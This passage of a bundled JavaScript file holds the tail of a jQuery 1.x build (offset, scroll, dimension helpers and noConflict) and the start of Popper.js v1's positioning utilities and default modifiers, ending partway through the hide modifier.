          "ajaxStop",
          "ajaxComplete",
          "ajaxError",
          "ajaxSuccess",
          "ajaxSend",
        ],
        function (t, e) {
          f.fn[e] = function (t) {
            return this.on(e, t);
          };
        }
      ),
      (f.expr.filters.animated = function (t) {
        return f.grep(f.timers, function (e) {
          return t === e.elem;
        }).length;
      }),
      (f.offset = {
        setOffset: function (t, e, n) {
          var i,
            o,
            r,
            s,
            a,
            l,
            c = f.css(t, "position"),
            u = f(t),
            d = {};
          "static" === c && (t.style.position = "relative"),
            (a = u.offset()),
            (r = f.css(t, "top")),
            (l = f.css(t, "left")),
            ("absolute" === c || "fixed" === c) &&
            f.inArray("auto", [r, l]) > -1
              ? ((s = (i = u.position()).top), (o = i.left))
              : ((s = parseFloat(r) || 0), (o = parseFloat(l) || 0)),
            f.isFunction(e) && (e = e.call(t, n, f.extend({}, a))),
            null != e.top && (d.top = e.top - a.top + s),
            null != e.left && (d.left = e.left - a.left + o),
            "using" in e ? e.using.call(t, d) : u.css(d);
        },
      }),
      f.fn.extend({
        offset: function (t) {
          if (arguments.length)
            return void 0 === t
              ? this
              : this.each(function (e) {
                  f.offset.setOffset(this, t, e);
                });
          var e,
            n,
            i = { top: 0, left: 0 },
            o = this[0],
            r = o && o.ownerDocument;
          return r
            ? ((e = r.documentElement),
              f.contains(e, o)
                ? (void 0 !== o.getBoundingClientRect &&
                    (i = o.getBoundingClientRect()),
                  (n = on(r)),
                  {
                    top:
                      i.top +
                      (n.pageYOffset || e.scrollTop) -
                      (e.clientTop || 0),
                    left:
                      i.left +
                      (n.pageXOffset || e.scrollLeft) -
                      (e.clientLeft || 0),
                  })
                : i)
            : void 0;
        },
        position: function () {
          if (this[0]) {
            var t,
              e,
              n = { top: 0, left: 0 },
              i = this[0];
            return (
              "fixed" === f.css(i, "position")
                ? (e = i.getBoundingClientRect())
                : ((t = this.offsetParent()),
                  (e = this.offset()),
                  f.nodeName(t[0], "html") || (n = t.offset()),
                  (n.top += f.css(t[0], "borderTopWidth", !0)),
                  (n.left += f.css(t[0], "borderLeftWidth", !0))),
              {
                top: e.top - n.top - f.css(i, "marginTop", !0),
                left: e.left - n.left - f.css(i, "marginLeft", !0),
              }
            );
          }
        },
        offsetParent: function () {
          return this.map(function () {
            for (
              var t = this.offsetParent;
              t && !f.nodeName(t, "html") && "static" === f.css(t, "position");

            )
              t = t.offsetParent;
            return t || It;
          });
        },
      }),
      f.each(
        { scrollLeft: "pageXOffset", scrollTop: "pageYOffset" },
        function (t, e) {
          var n = /Y/.test(e);
          f.fn[t] = function (i) {
            return Y(
              this,
              function (t, i, o) {
                var r = on(t);
                return void 0 === o
                  ? r
                    ? e in r
                      ? r[e]
                      : r.document.documentElement[i]
                    : t[i]
                  : void (r
                      ? r.scrollTo(
                          n ? f(r).scrollLeft() : o,
                          n ? o : f(r).scrollTop()
                        )
                      : (t[i] = o));
              },
              t,
              i,
              arguments.length,
              null
            );
          };
        }
      ),
      f.each(["top", "left"], function (t, e) {
        f.cssHooks[e] = qt(d.pixelPosition, function (t, n) {
          return n
            ? ((n = Rt(t, e)), zt.test(n) ? f(t).position()[e] + "px" : n)
            : void 0;
        });
      }),
      f.each({ Height: "height", Width: "width" }, function (t, e) {
        f.each(
          { padding: "inner" + t, content: e, "": "outer" + t },
          function (n, i) {
            f.fn[i] = function (i, o) {
              var r = arguments.length && (n || "boolean" != typeof i),
                s = n || (!0 === i || !0 === o ? "margin" : "border");
              return Y(
                this,
                function (e, n, i) {
                  var o;
                  return f.isWindow(e)
                    ? e.document.documentElement["client" + t]
                    : 9 === e.nodeType
                    ? ((o = e.documentElement),
                      Math.max(
                        e.body["scroll" + t],
                        o["scroll" + t],
                        e.body["offset" + t],
                        o["offset" + t],
                        o["client" + t]
                      ))
                    : void 0 === i
                    ? f.css(e, n, s)
                    : f.style(e, n, i, s);
                },
                e,
                r ? i : void 0,
                r,
                null
              );
            };
          }
        );
      }),
      f.fn.extend({
        bind: function (t, e, n) {
          return this.on(t, null, e, n);
        },
        unbind: function (t, e) {
          return this.off(t, null, e);
        },
        delegate: function (t, e, n, i) {
          return this.on(e, t, n, i);
        },
        undelegate: function (t, e, n) {
          return 1 === arguments.length
            ? this.off(t, "**")
            : this.off(e, t || "**", n);
        },
      }),
      (f.fn.size = function () {
        return this.length;
      }),
      (f.fn.andSelf = f.fn.addBack),
      "function" == typeof define &&
        define.amd &&
        define("jquery", [], function () {
          return f;
        });
    var rn = t.jQuery,
      sn = t.$;
    return (
      (f.noConflict = function (e) {
        return (
          t.$ === f && (t.$ = sn), e && t.jQuery === f && (t.jQuery = rn), f
        );
      }),
      e || (t.jQuery = t.$ = f),
      f
    );
  }),
  (function (t, e) {
    "object" == typeof exports && "undefined" != typeof module
      ? (module.exports = e())
      : "function" == typeof define && define.amd
      ? define(e)
      : (t.Popper = e());
  })(this, function () {
    "use strict";
    function t(t) {
      return t && "[object Function]" === {}.toString.call(t);
    }
    function e(t, e) {
      if (1 !== t.nodeType) return [];
      var n = getComputedStyle(t, null);
      return e ? n[e] : n;
    }
    function n(t) {
      return "HTML" === t.nodeName ? t : t.parentNode || t.host;
    }
    function i(t) {
      if (!t) return document.body;
      switch (t.nodeName) {
        case "HTML":
        case "BODY":
          return t.ownerDocument.body;
        case "#document":
          return t.body;
      }
      var o = e(t),
        r = o.overflow,
        s = o.overflowX,
        a = o.overflowY;
      return /(auto|scroll|overlay)/.test(r + a + s) ? t : i(n(t));
    }
    function o(t) {
      return 11 === t ? G : 10 === t ? Z : G || Z;
    }
    function r(t) {
      if (!t) return document.documentElement;
      for (
        var n = o(10) ? document.body : null, i = t.offsetParent;
        i === n && t.nextElementSibling;

      )
        i = (t = t.nextElementSibling).offsetParent;
      var s = i && i.nodeName;
      return s && "BODY" !== s && "HTML" !== s
        ? -1 !== ["TD", "TABLE"].indexOf(i.nodeName) &&
          "static" === e(i, "position")
          ? r(i)
          : i
        : t
        ? t.ownerDocument.documentElement
        : document.documentElement;
    }
    function s(t) {
      return null === t.parentNode ? t : s(t.parentNode);
    }
    function a(t, e) {
      if (!(t && t.nodeType && e && e.nodeType))
        return document.documentElement;
      var n = t.compareDocumentPosition(e) & Node.DOCUMENT_POSITION_FOLLOWING,
        i = n ? t : e,
        o = n ? e : t,
        l = document.createRange();
      l.setStart(i, 0), l.setEnd(o, 0);
      var c = l.commonAncestorContainer;
      if ((t !== c && e !== c) || i.contains(o))
        return (function (t) {
          var e = t.nodeName;
          return "BODY" !== e && ("HTML" === e || r(t.firstElementChild) === t);
        })(c)
          ? c
          : r(c);
      var u = s(t);
      return u.host ? a(u.host, e) : a(t, s(e).host);
    }
    function l(t) {
      var e =
          1 < arguments.length && void 0 !== arguments[1]
            ? arguments[1]
            : "top",
        n = "top" === e ? "scrollTop" : "scrollLeft",
        i = t.nodeName;
      if ("BODY" === i || "HTML" === i) {
        var o = t.ownerDocument.documentElement,
          r = t.ownerDocument.scrollingElement || o;
        return r[n];
      }
      return t[n];
    }
    function c(t, e) {
      var n = 2 < arguments.length && void 0 !== arguments[2] && arguments[2],
        i = l(e, "top"),
        o = l(e, "left"),
        r = n ? -1 : 1;
      return (
        (t.top += i * r),
        (t.bottom += i * r),
        (t.left += o * r),
        (t.right += o * r),
        t
      );
    }
    function u(t, e) {
      var n = "x" === e ? "Left" : "Top",
        i = "Left" == n ? "Right" : "Bottom";
      return (
        parseFloat(t["border" + n + "Width"], 10) +
        parseFloat(t["border" + i + "Width"], 10)
      );
    }
    function d(t, e, n, i) {
      return U(
        e["offset" + t],
        e["scroll" + t],
        n["client" + t],
        n["offset" + t],
        n["scroll" + t],
        o(10)
          ? n["offset" + t] +
              i["margin" + ("Height" === t ? "Top" : "Left")] +
              i["margin" + ("Height" === t ? "Bottom" : "Right")]
          : 0
      );
    }
    function h() {
      var t = document.body,
        e = document.documentElement,
        n = o(10) && getComputedStyle(e);
      return { height: d("Height", t, e, n), width: d("Width", t, e, n) };
    }
    function f(t) {
      return nt({}, t, { right: t.left + t.width, bottom: t.top + t.height });
    }
    function p(t) {
      var n = {};
      try {
        if (o(10)) {
          n = t.getBoundingClientRect();
          var i = l(t, "top"),
            r = l(t, "left");
          (n.top += i), (n.left += r), (n.bottom += i), (n.right += r);
        } else n = t.getBoundingClientRect();
      } catch (t) {}
      var s = {
          left: n.left,
          top: n.top,
          width: n.right - n.left,
          height: n.bottom - n.top,
        },
        a = "HTML" === t.nodeName ? h() : {},
        c = a.width || t.clientWidth || s.right - s.left,
        d = a.height || t.clientHeight || s.bottom - s.top,
        p = t.offsetWidth - c,
        g = t.offsetHeight - d;
      if (p || g) {
        var m = e(t);
        (p -= u(m, "x")), (g -= u(m, "y")), (s.width -= p), (s.height -= g);
      }
      return f(s);
    }
    function g(t, n) {
      var r = 2 < arguments.length && void 0 !== arguments[2] && arguments[2],
        s = o(10),
        a = "HTML" === n.nodeName,
        l = p(t),
        u = p(n),
        d = i(t),
        h = e(n),
        g = parseFloat(h.borderTopWidth, 10),
        m = parseFloat(h.borderLeftWidth, 10);
      r &&
        "HTML" === n.nodeName &&
        ((u.top = U(u.top, 0)), (u.left = U(u.left, 0)));
      var v = f({
        top: l.top - u.top - g,
        left: l.left - u.left - m,
        width: l.width,
        height: l.height,
      });
      if (((v.marginTop = 0), (v.marginLeft = 0), !s && a)) {
        var y = parseFloat(h.marginTop, 10),
          b = parseFloat(h.marginLeft, 10);
        (v.top -= g - y),
          (v.bottom -= g - y),
          (v.left -= m - b),
          (v.right -= m - b),
          (v.marginTop = y),
          (v.marginLeft = b);
      }
      return (
        (s && !r ? n.contains(d) : n === d && "BODY" !== d.nodeName) &&
          (v = c(v, n)),
        v
      );
    }
    function m(t) {
      var e = 1 < arguments.length && void 0 !== arguments[1] && arguments[1],
        n = t.ownerDocument.documentElement,
        i = g(t, n),
        o = U(n.clientWidth, window.innerWidth || 0),
        r = U(n.clientHeight, window.innerHeight || 0),
        s = e ? 0 : l(n),
        a = e ? 0 : l(n, "left"),
        c = {
          top: s - i.top + i.marginTop,
          left: a - i.left + i.marginLeft,
          width: o,
          height: r,
        };
      return f(c);
    }
    function v(t) {
      var i = t.nodeName;
      return (
        "BODY" !== i &&
        "HTML" !== i &&
        ("fixed" === e(t, "position") || v(n(t)))
      );
    }
    function y(t) {
      if (!t || !t.parentElement || o()) return document.documentElement;
      for (var n = t.parentElement; n && "none" === e(n, "transform"); )
        n = n.parentElement;
      return n || document.documentElement;
    }
    function b(t, e, o, r) {
      var s = 4 < arguments.length && void 0 !== arguments[4] && arguments[4],
        l = { top: 0, left: 0 },
        c = s ? y(t) : a(t, e);
      if ("viewport" === r) l = m(c, s);
      else {
        var u;
        "scrollParent" === r
          ? "BODY" === (u = i(n(e))).nodeName &&
            (u = t.ownerDocument.documentElement)
          : (u = "window" === r ? t.ownerDocument.documentElement : r);
        var d = g(u, c, s);
        if ("HTML" !== u.nodeName || v(c)) l = d;
        else {
          var f = h(),
            p = f.height,
            b = f.width;
          (l.top += d.top - d.marginTop),
            (l.bottom = p + d.top),
            (l.left += d.left - d.marginLeft),
            (l.right = b + d.left);
        }
      }
      return (l.left += o), (l.top += o), (l.right -= o), (l.bottom -= o), l;
    }
    function _(t) {
      return t.width * t.height;
    }
    function w(t, e, n, i, o) {
      var r =
        5 < arguments.length && void 0 !== arguments[5] ? arguments[5] : 0;
      if (-1 === t.indexOf("auto")) return t;
      var s = b(n, i, r, o),
        a = {
          top: { width: s.width, height: e.top - s.top },
          right: { width: s.right - e.right, height: s.height },
          bottom: { width: s.width, height: s.bottom - e.bottom },
          left: { width: e.left - s.left, height: s.height },
        },
        l = Object.keys(a)
          .map(function (t) {
            return nt({ key: t }, a[t], { area: _(a[t]) });
          })
          .sort(function (t, e) {
            return e.area - t.area;
          }),
        c = l.filter(function (t) {
          var e = t.width,
            i = t.height;
          return e >= n.clientWidth && i >= n.clientHeight;
        }),
        u = 0 < c.length ? c[0].key : l[0].key,
        d = t.split("-")[1];
      return u + (d ? "-" + d : "");
    }
    function x(t, e, n) {
      var i =
          3 < arguments.length && void 0 !== arguments[3] ? arguments[3] : null,
        o = i ? y(e) : a(e, n);
      return g(n, o, i);
    }
    function E(t) {
      var e = getComputedStyle(t),
        n = parseFloat(e.marginTop) + parseFloat(e.marginBottom),
        i = parseFloat(e.marginLeft) + parseFloat(e.marginRight);
      return { width: t.offsetWidth + i, height: t.offsetHeight + n };
    }
    function T(t) {
      var e = { left: "right", right: "left", bottom: "top", top: "bottom" };
      return t.replace(/left|right|bottom|top/g, function (t) {
        return e[t];
      });
    }
    function C(t, e, n) {
      n = n.split("-")[0];
      var i = E(t),
        o = { width: i.width, height: i.height },
        r = -1 !== ["right", "left"].indexOf(n),
        s = r ? "top" : "left",
        a = r ? "left" : "top",
        l = r ? "height" : "width",
        c = r ? "width" : "height";
      return (
        (o[s] = e[s] + e[l] / 2 - i[l] / 2),
        (o[a] = n === a ? e[a] - i[c] : e[T(a)]),
        o
      );
    }
    function A(t, e) {
      return Array.prototype.find ? t.find(e) : t.filter(e)[0];
    }
    function k(e, n, i) {
      return (
        (void 0 === i
          ? e
          : e.slice(
              0,
              (function (t, e, n) {
                if (Array.prototype.findIndex)
                  return t.findIndex(function (t) {
                    return t[e] === n;
                  });
                var i = A(t, function (t) {
                  return t[e] === n;
                });
                return t.indexOf(i);
              })(e, "name", i)
            )
        ).forEach(function (e) {
          e.function &&
            console.warn(
              "`modifier.function` is deprecated, use `modifier.fn`!"
            );
          var i = e.function || e.fn;
          e.enabled &&
            t(i) &&
            ((n.offsets.popper = f(n.offsets.popper)),
            (n.offsets.reference = f(n.offsets.reference)),
            (n = i(n, e)));
        }),
        n
      );
    }
    function S() {
      if (!this.state.isDestroyed) {
        var t = {
          instance: this,
          styles: {},
          arrowStyles: {},
          attributes: {},
          flipped: !1,
          offsets: {},
        };
        (t.offsets.reference = x(
          this.state,
          this.popper,
          this.reference,
          this.options.positionFixed
        )),
          (t.placement = w(
            this.options.placement,
            t.offsets.reference,
            this.popper,
            this.reference,
            this.options.modifiers.flip.boundariesElement,
            this.options.modifiers.flip.padding
          )),
          (t.originalPlacement = t.placement),
          (t.positionFixed = this.options.positionFixed),
          (t.offsets.popper = C(this.popper, t.offsets.reference, t.placement)),
          (t.offsets.popper.position = this.options.positionFixed
            ? "fixed"
            : "absolute"),
          (t = k(this.modifiers, t)),
          this.state.isCreated
            ? this.options.onUpdate(t)
            : ((this.state.isCreated = !0), this.options.onCreate(t));
      }
    }
    function L(t, e) {
      return t.some(function (t) {
        var n = t.name;
        return t.enabled && n === e;
      });
    }
    function D(t) {
      for (
        var e = [!1, "ms", "Webkit", "Moz", "O"],
          n = t.charAt(0).toUpperCase() + t.slice(1),
          i = 0;
        i < e.length;
        i++
      ) {
        var o = e[i],
          r = o ? "" + o + n : t;
        if (void 0 !== document.body.style[r]) return r;
      }
      return null;
    }
    function N() {
      return (
        (this.state.isDestroyed = !0),
        L(this.modifiers, "applyStyle") &&
          (this.popper.removeAttribute("x-placement"),
          (this.popper.style.position = ""),
          (this.popper.style.top = ""),
          (this.popper.style.left = ""),
          (this.popper.style.right = ""),
          (this.popper.style.bottom = ""),
          (this.popper.style.willChange = ""),
          (this.popper.style[D("transform")] = "")),
        this.disableEventListeners(),
        this.options.removeOnDestroy &&
          this.popper.parentNode.removeChild(this.popper),
        this
      );
    }
    function O(t) {
      var e = t.ownerDocument;
      return e ? e.defaultView : window;
    }
    function j(t, e, n, o) {
      var r = "BODY" === t.nodeName,
        s = r ? t.ownerDocument.defaultView : t;
      s.addEventListener(e, n, { passive: !0 }),
        r || j(i(s.parentNode), e, n, o),
        o.push(s);
    }
    function P(t, e, n, o) {
      (n.updateBound = o),
        O(t).addEventListener("resize", n.updateBound, { passive: !0 });
      var r = i(t);
      return (
        j(r, "scroll", n.updateBound, n.scrollParents),
        (n.scrollElement = r),
        (n.eventsEnabled = !0),
        n
      );
    }
    function H() {
      this.state.eventsEnabled ||
        (this.state = P(
          this.reference,
          this.options,
          this.state,
          this.scheduleUpdate
        ));
    }
    function M() {
      this.state.eventsEnabled &&
        (cancelAnimationFrame(this.scheduleUpdate),
        (this.state = (function (t, e) {
          return (
            O(t).removeEventListener("resize", e.updateBound),
            e.scrollParents.forEach(function (t) {
              t.removeEventListener("scroll", e.updateBound);
            }),
            (e.updateBound = null),
            (e.scrollParents = []),
            (e.scrollElement = null),
            (e.eventsEnabled = !1),
            e
          );
        })(this.reference, this.state)));
    }
    function z(t) {
      return "" !== t && !isNaN(parseFloat(t)) && isFinite(t);
    }
    function B(t, e) {
      Object.keys(e).forEach(function (n) {
        var i = "";
        -1 !==
          ["width", "height", "top", "right", "bottom", "left"].indexOf(n) &&
          z(e[n]) &&
          (i = "px"),
          (t.style[n] = e[n] + i);
      });
    }
    function I(t, e, n) {
      var i = A(t, function (t) {
          return t.name === e;
        }),
        o =
          !!i &&
          t.some(function (t) {
            return t.name === n && t.enabled && t.order < i.order;
          });
      if (!o) {
        var r = "`" + e + "`";
        console.warn(
          "`" +
            n +
            "` modifier is required by " +
            r +
            " modifier in order to work, be sure to include it before " +
            r +
            "!"
        );
      }
      return o;
    }
    function $(t) {
      var e = 1 < arguments.length && void 0 !== arguments[1] && arguments[1],
        n = ot.indexOf(t),
        i = ot.slice(n + 1).concat(ot.slice(0, n));
      return e ? i.reverse() : i;
    }
    function R(t, e, n, i) {
      var o = [0, 0],
        r = -1 !== ["right", "left"].indexOf(i),
        s = t.split(/(\+|\-)/).map(function (t) {
          return t.trim();
        }),
        a = s.indexOf(
          A(s, function (t) {
            return -1 !== t.search(/,|\s/);
          })
        );
      s[a] &&
        -1 === s[a].indexOf(",") &&
        console.warn(
          "Offsets separated by white space(s) are deprecated, use a comma (,) instead."
        );
      var l = /\s*,\s*|\s+/,
        c =
          -1 === a
            ? [s]
            : [
                s.slice(0, a).concat([s[a].split(l)[0]]),
                [s[a].split(l)[1]].concat(s.slice(a + 1)),
              ];
      return (
        (c = c.map(function (t, i) {
          var o = (1 === i ? !r : r) ? "height" : "width",
            s = !1;
          return t
            .reduce(function (t, e) {
              return "" === t[t.length - 1] && -1 !== ["+", "-"].indexOf(e)
                ? ((t[t.length - 1] = e), (s = !0), t)
                : s
                ? ((t[t.length - 1] += e), (s = !1), t)
                : t.concat(e);
            }, [])
            .map(function (t) {
              return (function (t, e, n, i) {
                var o = t.match(/((?:\-|\+)?\d*\.?\d*)(.*)/),
                  r = +o[1],
                  s = o[2];
                if (!r) return t;
                if (0 === s.indexOf("%")) {
                  var a;
                  switch (s) {
                    case "%p":
                      a = n;
                      break;
                    case "%":
                    case "%r":
                    default:
                      a = i;
                  }
                  return (f(a)[e] / 100) * r;
                }
                return "vh" === s || "vw" === s
                  ? (("vh" === s
                      ? U(
                          document.documentElement.clientHeight,
                          window.innerHeight || 0
                        )
                      : U(
                          document.documentElement.clientWidth,
                          window.innerWidth || 0
                        )) /
                      100) *
                      r
                  : r;
              })(t, o, e, n);
            });
        })).forEach(function (t, e) {
          t.forEach(function (n, i) {
            z(n) && (o[e] += n * ("-" === t[i - 1] ? -1 : 1));
          });
        }),
        o
      );
    }
    for (
      var W = Math.min,
        q = Math.round,
        F = Math.floor,
        U = Math.max,
        X = "undefined" != typeof window && "undefined" != typeof document,
        V = ["Edge", "Trident", "Firefox"],
        Y = 0,
        K = 0;
      K < V.length;
      K += 1
    )
      if (X && 0 <= navigator.userAgent.indexOf(V[K])) {
        Y = 1;
        break;
      }
    var Q =
        X && window.Promise
          ? function (t) {
              var e = !1;
              return function () {
                e ||
                  ((e = !0),
                  window.Promise.resolve().then(function () {
                    (e = !1), t();
                  }));
              };
            }
          : function (t) {
              var e = !1;
              return function () {
                e ||
                  ((e = !0),
                  setTimeout(function () {
                    (e = !1), t();
                  }, Y));
              };
            },
      G = X && !(!window.MSInputMethodContext || !document.documentMode),
      Z = X && /MSIE 10/.test(navigator.userAgent),
      J = function (t, e) {
        if (!(t instanceof e))
          throw new TypeError("Cannot call a class as a function");
      },
      tt = (function () {
        function t(t, e) {
          for (var n, i = 0; i < e.length; i++)
            ((n = e[i]).enumerable = n.enumerable || !1),
              (n.configurable = !0),
              "value" in n && (n.writable = !0),
              Object.defineProperty(t, n.key, n);
        }
        return function (e, n, i) {
          return n && t(e.prototype, n), i && t(e, i), e;
        };
      })(),
      et = function (t, e, n) {
        return (
          e in t
            ? Object.defineProperty(t, e, {
                value: n,
                enumerable: !0,
                configurable: !0,
                writable: !0,
              })
            : (t[e] = n),
          t
        );
      },
      nt =
        Object.assign ||
        function (t) {
          for (var e, n = 1; n < arguments.length; n++)
            for (var i in (e = arguments[n]))
              Object.prototype.hasOwnProperty.call(e, i) && (t[i] = e[i]);
          return t;
        },
      it = [
        "auto-start",
        "auto",
        "auto-end",
        "top-start",
        "top",
        "top-end",
        "right-start",
        "right",
        "right-end",
        "bottom-end",
        "bottom",
        "bottom-start",
        "left-end",
        "left",
        "left-start",
      ],
      ot = it.slice(3),
      rt = "flip",
      st = "clockwise",
      at = "counterclockwise",
      lt = (function () {
        function e(n, i) {
          var o = this,
            r =
              2 < arguments.length && void 0 !== arguments[2]
                ? arguments[2]
                : {};
          J(this, e),
            (this.scheduleUpdate = function () {
              return requestAnimationFrame(o.update);
            }),
            (this.update = Q(this.update.bind(this))),
            (this.options = nt({}, e.Defaults, r)),
            (this.state = {
              isDestroyed: !1,
              isCreated: !1,
              scrollParents: [],
            }),
            (this.reference = n && n.jquery ? n[0] : n),
            (this.popper = i && i.jquery ? i[0] : i),
            (this.options.modifiers = {}),
            Object.keys(nt({}, e.Defaults.modifiers, r.modifiers)).forEach(
              function (t) {
                o.options.modifiers[t] = nt(
                  {},
                  e.Defaults.modifiers[t] || {},
                  r.modifiers ? r.modifiers[t] : {}
                );
              }
            ),
            (this.modifiers = Object.keys(this.options.modifiers)
              .map(function (t) {
                return nt({ name: t }, o.options.modifiers[t]);
              })
              .sort(function (t, e) {
                return t.order - e.order;
              })),
            this.modifiers.forEach(function (e) {
              e.enabled &&
                t(e.onLoad) &&
                e.onLoad(o.reference, o.popper, o.options, e, o.state);
            }),
            this.update();
          var s = this.options.eventsEnabled;
          s && this.enableEventListeners(), (this.state.eventsEnabled = s);
        }
        return (
          tt(e, [
            {
              key: "update",
              value: function () {
                return S.call(this);
              },
            },
            {
              key: "destroy",
              value: function () {
                return N.call(this);
              },
            },
            {
              key: "enableEventListeners",
              value: function () {
                return H.call(this);
              },
            },
            {
              key: "disableEventListeners",
              value: function () {
                return M.call(this);
              },
            },
          ]),
          e
        );
      })();
    return (
      (lt.Utils = ("undefined" == typeof window ? global : window).PopperUtils),
      (lt.placements = it),
      (lt.Defaults = {
        placement: "bottom",
        positionFixed: !1,
        eventsEnabled: !0,
        removeOnDestroy: !1,
        onCreate: function () {},
        onUpdate: function () {},
        modifiers: {
          shift: {
            order: 100,
            enabled: !0,
            fn: function (t) {
              var e = t.placement,
                n = e.split("-")[0],
                i = e.split("-")[1];
              if (i) {
                var o = t.offsets,
                  r = o.reference,
                  s = o.popper,
                  a = -1 !== ["bottom", "top"].indexOf(n),
                  l = a ? "left" : "top",
                  c = a ? "width" : "height",
                  u = {
                    start: et({}, l, r[l]),
                    end: et({}, l, r[l] + r[c] - s[c]),
                  };
                t.offsets.popper = nt({}, s, u[i]);
              }
              return t;
            },
          },
          offset: {
            order: 200,
            enabled: !0,
            fn: function (t, e) {
              var n,
                i = e.offset,
                o = t.placement,
                r = t.offsets,
                s = r.popper,
                a = r.reference,
                l = o.split("-")[0];
              return (
                (n = z(+i) ? [+i, 0] : R(i, s, a, l)),
                "left" === l
                  ? ((s.top += n[0]), (s.left -= n[1]))
                  : "right" === l
                  ? ((s.top += n[0]), (s.left += n[1]))
                  : "top" === l
                  ? ((s.left += n[0]), (s.top -= n[1]))
                  : "bottom" === l && ((s.left += n[0]), (s.top += n[1])),
                (t.popper = s),
                t
              );
            },
            offset: 0,
          },
          preventOverflow: {
            order: 300,
            enabled: !0,
            fn: function (t, e) {
              var n = e.boundariesElement || r(t.instance.popper);
              t.instance.reference === n && (n = r(n));
              var i = D("transform"),
                o = t.instance.popper.style,
                s = o.top,
                a = o.left,
                l = o[i];
              (o.top = ""), (o.left = ""), (o[i] = "");
              var c = b(
                t.instance.popper,
                t.instance.reference,
                e.padding,
                n,
                t.positionFixed
              );
              (o.top = s), (o.left = a), (o[i] = l), (e.boundaries = c);
              var u = e.priority,
                d = t.offsets.popper,
                h = {
                  primary: function (t) {
                    var n = d[t];
                    return (
                      d[t] < c[t] &&
                        !e.escapeWithReference &&
                        (n = U(d[t], c[t])),
                      et({}, t, n)
                    );
                  },
                  secondary: function (t) {
                    var n = "right" === t ? "left" : "top",
                      i = d[n];
                    return (
                      d[t] > c[t] &&
                        !e.escapeWithReference &&
                        (i = W(
                          d[n],
                          c[t] - ("right" === t ? d.width : d.height)
                        )),
                      et({}, n, i)
                    );
                  },
                };
              return (
                u.forEach(function (t) {
                  var e =
                    -1 === ["left", "top"].indexOf(t) ? "secondary" : "primary";
                  d = nt({}, d, h[e](t));
                }),
                (t.offsets.popper = d),
                t
              );
            },
            priority: ["left", "right", "top", "bottom"],
            padding: 5,
            boundariesElement: "scrollParent",
          },
          keepTogether: {
            order: 400,
            enabled: !0,
            fn: function (t) {
              var e = t.offsets,
                n = e.popper,
                i = e.reference,
                o = t.placement.split("-")[0],
                r = F,
                s = -1 !== ["top", "bottom"].indexOf(o),
                a = s ? "right" : "bottom",
                l = s ? "left" : "top",
                c = s ? "width" : "height";
              return (
                n[a] < r(i[l]) && (t.offsets.popper[l] = r(i[l]) - n[c]),
                n[l] > r(i[a]) && (t.offsets.popper[l] = r(i[a])),
                t
              );
            },
          },
          arrow: {
            order: 500,
            enabled: !0,
            fn: function (t, n) {
              var i;
              if (!I(t.instance.modifiers, "arrow", "keepTogether")) return t;
              var o = n.element;
              if ("string" == typeof o) {
                if (!(o = t.instance.popper.querySelector(o))) return t;
              } else if (!t.instance.popper.contains(o))
                return (
                  console.warn(
                    "WARNING: `arrow.element` must be child of its popper element!"
                  ),
                  t
                );
              var r = t.placement.split("-")[0],
                s = t.offsets,
                a = s.popper,
                l = s.reference,
                c = -1 !== ["left", "right"].indexOf(r),
                u = c ? "height" : "width",
                d = c ? "Top" : "Left",
                h = d.toLowerCase(),
                p = c ? "left" : "top",
                g = c ? "bottom" : "right",
                m = E(o)[u];
              l[g] - m < a[h] && (t.offsets.popper[h] -= a[h] - (l[g] - m)),
                l[h] + m > a[g] && (t.offsets.popper[h] += l[h] + m - a[g]),
                (t.offsets.popper = f(t.offsets.popper));
              var v = l[h] + l[u] / 2 - m / 2,
                y = e(t.instance.popper),
                b = parseFloat(y["margin" + d], 10),
                _ = parseFloat(y["border" + d + "Width"], 10),
                w = v - t.offsets.popper[h] - b - _;
              return (
                (w = U(W(a[u] - m, w), 0)),
                (t.arrowElement = o),
                (t.offsets.arrow = (et((i = {}), h, q(w)), et(i, p, ""), i)),
                t
              );
            },
            element: "[x-arrow]",
          },
          flip: {
            order: 600,
            enabled: !0,
            fn: function (t, e) {
              if (L(t.instance.modifiers, "inner")) return t;
              if (t.flipped && t.placement === t.originalPlacement) return t;
              var n = b(
                  t.instance.popper,
                  t.instance.reference,
                  e.padding,
                  e.boundariesElement,
                  t.positionFixed
                ),
                i = t.placement.split("-")[0],
                o = T(i),
                r = t.placement.split("-")[1] || "",
                s = [];
              switch (e.behavior) {
                case rt:
                  s = [i, o];
                  break;
                case st:
                  s = $(i);
                  break;
                case at:
                  s = $(i, !0);
                  break;
                default:
                  s = e.behavior;
              }
              return (
                s.forEach(function (a, l) {
                  if (i !== a || s.length === l + 1) return t;
                  (i = t.placement.split("-")[0]), (o = T(i));
                  var c = t.offsets.popper,
                    u = t.offsets.reference,
                    d = F,
                    h =
                      ("left" === i && d(c.right) > d(u.left)) ||
                      ("right" === i && d(c.left) < d(u.right)) ||
                      ("top" === i && d(c.bottom) > d(u.top)) ||
                      ("bottom" === i && d(c.top) < d(u.bottom)),
                    f = d(c.left) < d(n.left),
                    p = d(c.right) > d(n.right),
                    g = d(c.top) < d(n.top),
                    m = d(c.bottom) > d(n.bottom),
                    v =
                      ("left" === i && f) ||
                      ("right" === i && p) ||
                      ("top" === i && g) ||
                      ("bottom" === i && m),
                    y = -1 !== ["top", "bottom"].indexOf(i),
                    b =
                      !!e.flipVariations &&
                      ((y && "start" === r && f) ||
                        (y && "end" === r && p) ||
                        (!y && "start" === r && g) ||
                        (!y && "end" === r && m));
                  (h || v || b) &&
                    ((t.flipped = !0),
                    (h || v) && (i = s[l + 1]),
                    b &&
                      (r = (function (t) {
                        return "end" === t
                          ? "start"
                          : "start" === t
                          ? "end"
                          : t;
                      })(r)),
                    (t.placement = i + (r ? "-" + r : "")),
                    (t.offsets.popper = nt(
                      {},
                      t.offsets.popper,
                      C(t.instance.popper, t.offsets.reference, t.placement)
                    )),
                    (t = k(t.instance.modifiers, t, "flip")));
                }),
                t
              );
            },
            behavior: "flip",
            padding: 5,
            boundariesElement: "viewport",
          },
          inner: {
            order: 700,
            enabled: !1,
            fn: function (t) {
              var e = t.placement,
                n = e.split("-")[0],
                i = t.offsets,
                o = i.popper,
                r = i.reference,
                s = -1 !== ["left", "right"].indexOf(n),
                a = -1 === ["top", "left"].indexOf(n);
              return (
                (o[s ? "left" : "top"] =
                  r[n] - (a ? o[s ? "width" : "height"] : 0)),
                (t.placement = T(e)),
                (t.offsets.popper = f(o)),
                t
              );
            },
          },
          hide: {
            order: 800,
            enabled: !0,
            fn: function (t) {
              if (!I(t.instance.modifiers, "hide", "preventOverflow")) return t;
              var e = t.offsets.reference,
                n = A(t.instance.modifiers, function (t) {
